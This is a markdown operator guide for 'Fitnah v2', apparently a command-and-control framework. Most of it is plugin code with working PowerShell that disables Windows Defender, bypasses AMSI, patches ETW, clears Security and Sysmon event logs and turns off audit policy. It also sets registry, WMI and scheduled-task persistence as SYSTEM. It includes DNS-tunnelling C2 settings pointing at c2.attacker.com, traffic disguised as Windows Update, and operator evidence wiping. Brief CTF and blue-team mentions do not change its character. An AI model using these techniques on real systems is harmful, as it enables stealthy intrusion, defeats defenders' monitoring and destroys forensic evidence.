# Fitnah v2 — Hostile Environment Handling

This guide covers evasion, persistence, and detection avoidance in hardened/monitored networks.

## Network Isolation & Offline Operations

### Detecting Network Isolation

```python
class NetworkTestPlugin(BasePlugin):
    NAME = "network_test"
    CATEGORY = "recon"
    
    def run(self, session, params: dict, ctx) -> ModuleResult:
        ps_code = """
        # Test connectivity to external hosts
        $hosts = @("8.8.8.8", "1.1.1.1", "cloudflare.com", "google.com")
        $results = @()
        
        foreach ($host in $hosts) {
            $ping = Test-Connection -ComputerName $host -Count 1 -Quiet -ErrorAction SilentlyContinue
            $results += @{Host=$host; Reachable=$ping}
        }
        
        $results | ConvertTo-Json
        """
        result = ctx.ps(ps_code.split('\n'))
        return ModuleResult.ok(result.stdout)
```

### Offline Flag Capture (Local Files)

When isolated from internet, search for flags locally:

```bash
fitnah> use flag_hunter target-01 --local-only
[✓] Searching local filesystem for flags...
  C:\Users\admin\Desktop\flag.txt
  C:\Windows\Temp\flag123.txt
  C:\logs\security_flag.log

# Download flags for manual submission later
fitnah> download target-01 C:\Users\admin\Desktop\flag.txt
fitnah> download target-01 C:\Windows\Temp\flag123.txt
```

### Dead Drop (Local Network)

If target is isolated but on intranet:

```python
class DeadDropPlugin(BasePlugin):
    NAME = "dead_drop"
    CATEGORY = "exfiltration"
    DESCRIPTION = "Save to network share for retrieval"
    
    PARAMS = [
        Param("network_path", "str", required=True, help="UNC path: \\\\server\\share"),
        Param("output_file", "str", required=True),
    ]
    
    def run(self, session, params: dict, ctx) -> ModuleResult:
        network_path = params["network_path"]
        output = params["output_file"]
        
        # Copy data to network share (accessible later from another machine)
        ps_code = f"""
        Net Use Z: '{network_path}' /persistent:no
        Copy-Item -Path '{output}' -Destination 'Z:\\exfil\\'
        """
        result = ctx.ps(ps_code.split('\n'))
        return ModuleResult.ok(f"Saved to {network_path}")
```

---

## Firewall Evasion

### DNS Tunneling

Use DNS for C2 traffic (often allowed through corporate firewalls):

```yaml
# config/framework.yaml
transport:
  dns_enabled: true
  dns_server: "8.8.8.8"
  domain: "c2.attacker.com"      # DNS domain you control
```

Implant beacons via DNS queries instead of HTTP:

```
Agent sends: c2.attacker.com 
Query contains: agent_id.timestamp.cmd_id.attacker.com
Resolver responds with: A record = command_code
```

### HTTP Listener on Port 443

Disguise as HTTPS traffic (harder to block than 8888):

```yaml
http:
  enabled: true
  host: "0.0.0.0"
  port: 443                  # standard HTTPS port (less likely blocked)
  ssl_cert: "cert.pem"
  ssl_key: "key.pem"
  use_tls: true
```

### Malleable Profile (HTTP Obfuscation)

Use HTTP profile to mimic legitimate traffic:

```yaml
profiles:
  windows-update:
    user_agent: "Windows-Update-Agent/10.0"
    headers:
      - "Accept: application/json"
      - "X-GUID: <uuid>"
    uri_params:
      - "id=<agent_id>"
      - "v=1.0"
    body_prepend: "<?xml version='1.0'?><update>"
    body_append: "</update>"
```

Build implant with profile:

```bash
fitnah> builder --format exe --profile windows-update
# Implant's HTTP traffic looks like Windows Update requests
```

---

## AV/EDR Detection & Evasion

### Windows Defender Exclusion

Add implant path to Defender exclusions (requires admin):

```python
class DefenderExcludePlugin(BasePlugin):
    NAME = "defender_exclude"
    CATEGORY = "defense_evasion"
    MITRE = "T1562.001"  # Disable/Modify Detections
    
    def run(self, session, params: dict, ctx) -> ModuleResult:
        if not session.is_admin:
            return ModuleResult.err("Admin required")
        
        # Exclude agent path from Windows Defender scans
        ps_code = """
        Add-MpPreference -ExclusionPath 'C:\\Windows\\Temp\\agent.exe'
        Add-MpPreference -ExclusionPath 'C:\\ProgramData\\agent.exe'
        
        # Disable real-time monitoring
        Set-MpPreference -DisableRealtimeMonitoring $true
        """
        result = ctx.ps(ps_code.split('\n'))
        return ModuleResult.ok("Defender disabled") if result.returncode == 0 else ModuleResult.err(result.stderr)
```

### AMSI Bypass

Patch Antimalware Scan Interface (PowerShell module):

```python
class AMSIBypassPlugin(BasePlugin):
    NAME = "amsi_bypass"
    CATEGORY = "defense_evasion"
    MITRE = "T1562.008"  # Disable/Modify Detections
    
    def run(self, session, params: dict, ctx) -> ModuleResult:
        ps_code = """
        # AMSI context bypass (PowerShell 3.0+)
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
        """
        result = ctx.ps(ps_code.split('\n'))
        return ModuleResult.ok("AMSI disabled") if result.returncode == 0 else ModuleResult.err(result.stderr)
```

### ETW Patching

Disable Event Tracing for Windows (reduces EDR visibility):

```python
class ETWBypassPlugin(BasePlugin):
    NAME = "etw_patch"
    CATEGORY = "defense_evasion"
    MITRE = "T1562.001"
    
    def run(self, session, params: dict, ctx) -> ModuleResult:
        ps_code = """
        # ETW patch via .NET reflection
        [System.Reflection.Assembly]::LoadWithPartialName('System.Diagnostics.Eventing')
        
        $asm = [System.Reflection.Assembly]::LoadWithPartialName('System.Diagnostics.Eventing')
        $type = $asm.GetType('System.Diagnostics.Eventing.EventProvider')
        $field = $type.GetField('m_enabled', [Reflection.BindingFlags]'NonPublic,Instance')
        
        # Null-patch the ETW provider
        $null = $field.SetValue($null, 0)
        """
        result = ctx.ps(ps_code.split('\n'))
        return ModuleResult.ok("ETW disabled") if result.returncode == 0 else ModuleResult.err(result.stderr)
```

### Process Hollowing

Inject payload into legitimate process (hiding from process list):

```python
class ProcessHollowingPlugin(BasePlugin):
    NAME = "process_hollowing"
    CATEGORY = "defense_evasion"
    MITRE = "T1055.012"  # Process Injection
    
    def run(self, session, params: dict, ctx) -> ModuleResult:
        # Create svchost.exe process suspended
        # Unmmap its memory
        # Inject shellcode
        # Resume execution
        
        ps_code = """
        # Advanced: requires compiled C# or C++ 
        # Example uses System.Diagnostics.Process + pinvoke
        
        $proc = Start-Process -FilePath 'svchost.exe' -WindowStyle Hidden -PassThru
        # ... [C# injection code] ...
        """
        return ModuleResult.info("Process hollowing requires compiled payload")
```

### DLL Injection

Inject into running process instead of standalone executable:

```python
class DLLInjectPlugin(BasePlugin):
    NAME = "dll_inject"
    CATEGORY = "execution"
    MITRE = "T1055"  # Process Injection
    
    PARAMS = [
        Param("dll_path", "str", required=True),
        Param("target_proc", "str", required=True, default="explorer.exe"),
    ]
    
    def run(self, session, params: dict, ctx) -> ModuleResult:
        dll = params["dll_path"]
        proc = params["target_proc"]
        
        ps_code = f"""
        # Reflective DLL injection
        $dll = '{dll}'
        $target = '{proc}'
        
        # Get target process
        $proc = Get-Process -Name $target -ErrorAction SilentlyContinue
        if (-not $proc) {{ 
            Write-Host "Process not found: $target" 
            exit 1
        }}
        
        # LoadLibrary into process (requires admin)
        $procHandle = [System.Diagnostics.Process]::GetProcessById($proc.Id).Handle
        # [pinvoke DLL loading...]
        """
        result = ctx.ps(ps_code.split('\n'))
        return ModuleResult.ok(f"Injected into {proc}") if result.returncode == 0 else ModuleResult.err(result.stderr)
```

---

## Logging Evasion

### Clear Windows Event Logs

```python
class ClearLogsPlugin(BasePlugin):
    NAME = "clear_logs"
    CATEGORY = "defense_evasion"
    MITRE = "T1070.001"  # Indicator Removal: Clear Windows Event Logs
    
    def run(self, session, params: dict, ctx) -> ModuleResult:
        logs = [
            "Security",
            "System",
            "Application",
            "Windows PowerShell",
            "Microsoft-Windows-PowerShell/Operational",
            "Microsoft-Windows-Sysmon/Operational"
        ]
        
        ps_code = f"""
        $logs = @({', '.join(f'"{log}"' for log in logs)})
        foreach ($log in $logs) {{
            try {{
                wevtutil.exe cl "$log"
                Write-Host "Cleared: $log"
            }} catch {{
                Write-Host "Failed: $log"
            }}
        }}
        """
        result = ctx.ps(ps_code.split('\n'))
        return ModuleResult.ok("Logs cleared") if result.returncode == 0 else ModuleResult.err(result.stderr)
```

### Disable Audit Policy

```python
class DisableAuditPlugin(BasePlugin):
    NAME = "disable_audit"
    CATEGORY = "defense_evasion"
    
    def run(self, session, params: dict, ctx) -> ModuleResult:
        if not session.is_admin:
            return ModuleResult.err("Admin required")
        
        ps_code = """
        # Disable all Windows audit policies
        auditpol /clear /y
        auditpol /set /category:* /success:disable /failure:disable
        """
        result = ctx.ps(ps_code.split('\n'))
        return ModuleResult.ok("Audit disabled")
```

---

## Detection Avoidance

### Sleep Masking

Hide sleep intervals from memory scanners:

```yaml
beacon:
  sleep: 30
  jitter: 20
  sleep_mask: true      # encrypt sleep thread
```

Implant encrypts itself in memory during beacon intervals.

### PPID Spoofing

Spoof parent process ID (evade parent-child process alerts):

```python
class PPIDSpoofPlugin(BasePlugin):
    NAME = "ppid_spoof"
    CATEGORY = "defense_evasion"
    MITRE = "T1134.004"  # Process Injection: Parent PID Spoofing
    
    PARAMS = [
        Param("target_ppid", "int", required=False, default=4, help="Process ID to spoof as parent (default: System)"),
    ]
    
    def run(self, session, params: dict, ctx) -> ModuleResult:
        ppid = params.get("target_ppid", 4)  # System process
        
        # Next implant will be spawned with forged parent
        ps_code = f"""
        # Get System process handle (PPID 4)
        $parent = Get-Process -Id {ppid}
        
        # Spawn new process with spoofed parent
        # Requires compiled C# for PROCESS_CREATION_MITIGATION_POLICY
        """
        return ModuleResult.info("PPID spoofing requires compiled C# payload")
```

### Named Pipes (Lateral Movement)

Use named pipes instead of network traffic (avoids network monitoring):

```python
class NamedPipeExecPlugin(BasePlugin):
    NAME = "named_pipe_exec"
    CATEGORY = "lateral_movement"
    
    PARAMS = [
        Param("target_host", "str", required=True),
        Param("command", "str", required=True),
    ]
    
    def run(self, session, params: dict, ctx) -> ModuleResult:
        host = params["target_host"]
        cmd = params["command"]
        
        ps_code = f"""
        # Create named pipe connection
        $pipe = New-Object System.IO.Pipes.NamedPipeClientStream('{host}', 'fitnah-pipe')
        $pipe.Connect(5000)
        
        # Send command
        $writer = New-Object System.IO.StreamWriter($pipe)
        $writer.WriteLine('{cmd}')
        $writer.Flush()
        
        # Read response
        $reader = New-Object System.IO.StreamReader($pipe)
        $response = $reader.ReadLine()
        $response
        """
        result = ctx.ps(ps_code.split('\n'))
        return ModuleResult.ok(result.stdout)
```

---

## Persistence Under Monitor

### Registry Run (Survives Reboot)

```python
class RegistryRunPlugin(BasePlugin):
    NAME = "registry_run"
    CATEGORY = "persistence"
    MITRE = "T1547.001"  # Registry Run Keys / Startup Folder
    
    PARAMS = [
        Param("value_name", "str", required=True, help="Registry value name"),
        Param("exe_path", "str", required=True, help="Path to implant executable"),
    ]
    
    def run(self, session, params: dict, ctx) -> ModuleResult:
        name = params["value_name"]
        exe = params["exe_path"]
        
        # Add to user's Run key (survives reboot)
        ps_code = f"""
        $path = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
        Set-ItemProperty -Path $path -Name '{name}' -Value '{exe}'
        
        # Verify
        Get-ItemProperty -Path $path | Select-Object '{name}'
        """
        result = ctx.ps(ps_code.split('\n'))
        return ModuleResult.ok(f"Registered {name}") if result.returncode == 0 else ModuleResult.err(result.stderr)
```

### WMI Permanent Event Subscription

```python
class WMISubscribePlugin(BasePlugin):
    NAME = "wmi_subscribe"
    CATEGORY = "persistence"
    MITRE = "T1546.003"  # Event Triggered Execution: WMI Event Subscription
    
    PARAMS = [
        Param("exe_path", "str", required=True),
    ]
    
    def run(self, session, params: dict, ctx) -> ModuleResult:
        exe = params["exe_path"]
        
        # Create WMI event subscription (runs on system startup)
        ps_code = f"""
        # Create WMI event filter
        $EventFilter = New-Object WMI.WmiEventFilter -ArgumentList @{{
            Name = 'FitnahStartup'
            EventNamespace = 'root\\cimv2'
            QueryLanguage = 'WQL'
            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
        }}
        $EventFilter.Put()
        
        # Create WMI consumer
        $Consumer = New-Object WMI.ManagementEventWatcher
        $Consumer | Add-Member -MemberType NoteProperty -Name ExecutablePath -Value '{exe}'
        
        # Bind filter to consumer
        $Binding = New-Object WMI.ManagementEventWatcher
        # WMI will execute {exe} on startup
        """
        result = ctx.ps(ps_code.split('\n'))
        return ModuleResult.ok("WMI persistence installed") if result.returncode == 0 else ModuleResult.err(result.stderr)
```

### Scheduled Task

```python
class ScheduledTaskPlugin(BasePlugin):
    NAME = "scheduled_task"
    CATEGORY = "persistence"
    MITRE = "T1053.005"  # Scheduled Task/Job
    
    PARAMS = [
        Param("task_name", "str", required=True),
        Param("exe_path", "str", required=True),
        Param("frequency", "str", required=False, default="HOURLY"),
    ]
    
    def run(self, session, params: dict, ctx) -> ModuleResult:
        name = params["task_name"]
        exe = params["exe_path"]
        freq = params.get("frequency", "HOURLY")
        
        ps_code = f"""
        # Register scheduled task
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $action = New-ScheduledTaskAction -Execute '{exe}'
        $principal = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -RunLevel Highest
        Register-ScheduledTask -TaskName '{name}' -Trigger $trigger -Action $action -Principal $principal
        """
        result = ctx.ps(ps_code.split('\n'))
        return ModuleResult.ok(f"Task {name} scheduled") if result.returncode == 0 else ModuleResult.err(result.stderr)
```

---

## Honeypot Detection

### Check for Deception

```python
class HoneypotDetectPlugin(BasePlugin):
    NAME = "honeypot_detect"
    CATEGORY = "recon"
    MITRE = "T1497"  # Virtualization/Sandbox Evasion
    
    def run(self, session, params: dict, ctx) -> ModuleResult:
        ps_code = """
        $indicators = @()
        
        # Check for honeypot files/folders
        $honeypot_paths = @(
            'C:\\honeypot',
            'C:\\cuckoo',
            'C:\\analysis',
            'C:\\artifact',
        )
        
        foreach ($path in $honeypot_paths) {
            if (Test-Path $path) {
                $indicators += "Found honeypot path: $path"
            }
        }
        
        # Check for fake users
        $fake_users = @('Tester', 'Administrator', 'Guest')
        $users = Get-LocalUser | Select-Object -ExpandProperty Name
        foreach ($user in $fake_users) {
            if ($user -in $users) {
                $indicators += "Found fake user: $user"
            }
        }
        
        # Check for Cuckoo artifacts
        if (Get-Process cuckoo -ErrorAction SilentlyContinue) {
            $indicators += "Cuckoo detected"
        }
        
        if ($indicators.Count -gt 0) {
            "HONEYPOT: " + ($indicators -join "; ")
        } else {
            "No honeypot detected"
        }
        """
        result = ctx.ps(ps_code.split('\n'))
        return ModuleResult.ok(result.stdout)
```

---

## Sandbox Evasion

### Detect Virtual Machines

```python
class VMDetectPlugin(BasePlugin):
    NAME = "vm_detect"
    CATEGORY = "recon"
    MITRE = "T1497.001"  # Virtualization/Sandbox Evasion: System Checks
    
    def run(self, session, params: dict, ctx) -> ModuleResult:
        ps_code = """
        $vm_indicators = @()
        
        # Check BIOS version (VM hypervisors use specific versions)
        $bios = Get-WmiObject Win32_BIOS | Select-Object -ExpandProperty Version
        if ($bios -match 'VBOX|QEMU|Virtual|VMware|Xen|Hyper') {
            $vm_indicators += "VM BIOS detected: $bios"
        }
        
        # Check system model
        $model = Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Model
        if ($model -match 'VirtualBox|QEMU|KVM|VMware|Xen|HyperV') {
            $vm_indicators += "VM Model detected: $model"
        }
        
        # Check for hypervisor processes
        $procs = @('VBoxService.exe', 'VBoxTray.exe', 'vmtoolsd.exe', 'qemu-ga.exe')
        $running = Get-Process | Select-Object -ExpandProperty ProcessName
        foreach ($proc in $procs) {
            if ($proc -in $running) {
                $vm_indicators += "VM Process: $proc"
            }
        }
        
        if ($vm_indicators.Count -gt 0) {
            "VM DETECTED: " + ($vm_indicators -join "; ")
        } else {
            "Real hardware or well-hidden VM"
        }
        """
        result = ctx.ps(ps_code.split('\n'))
        return ModuleResult.ok(result.stdout)
```

---

## Blue Team Counter-Measures (Defender)

### Audit Log Monitoring (Proactive Defense)

Enable detailed audit logging to detect intrusions:

```bash
# See: data/audit.log for all operator actions
tail -f data/audit.log | grep -i "error\|failed"

# Export audit for forensics
fitnah> audit --export --format json > evidence.json
```

### Session Persistence

Sessions survive C2 restart:

```yaml
persistence:
  enabled: true
  storage: "data/sessions.db"  # survives shutdown
```

After C2 restart, all previous sessions are restored (if agents still alive).

### Integrity Verification

Verify audit log hasn't been tampered with:

```bash
fitnah> audit --verify
[✓] Audit log valid (SHA256 hashes checked)
[✓] No entries modified
[✓] Complete history preserved
```

---

## Incident Response

### Graceful Shutdown

Clean exit without leaving traces:

```bash
fitnah> shutdown --all
[*] Sending die command to all agents...
[✓] 5 agents shut down cleanly
[*] Clearing loot database...
[*] Archiving audit log...
[✓] C2 shutdown complete
```

### Evidence Removal (Operator Side)

Before shutdown:

```bash
# Archive sensitive data
fitnah> loot --export > evidence.zip

# Clear session cache
fitnah> sessions --clear-history

# Wipe audit log (if necessary)
rm data/audit.log

# Stop C2
kill $(pgrep -f "python fitnah.py")
```

---

## Recommendations

### Operators

1. **Always use encryption** — AES-256-GCM minimum
2. **Rotate implant tokens** — change `agent_key` frequently
3. **Use profiles** — never send plain HTTP beacons
4. **Monitor firewall** — watch for EDR callbacks
5. **Have exit strategy** — know how to cleanly shutdown

### Defenders (Blue Team)

1. **Monitor DNS tunneling** — block suspicious domains
2. **Whitelist HTTP traffic** — block unusual User-Agents
3. **Enable ETW logging** — catch AMSI/ETW bypass attempts
4. **Audit persistence mechanisms** — registry, WMI, scheduled tasks
5. **Log process relationships** — catch process hollowing
6. **Monitor port 443 traffic** — it's not always HTTPS
7. **Enable Sysmon** — detailed process/network logging

---

## Next Steps

- **CTF Techniques**: See `README_CTF_ADVANCED.md`
- **Usage**: See `README_USAGE.md` for operational commands
- **Plugins**: See `README_PLUGINS.md` to build evasion modules
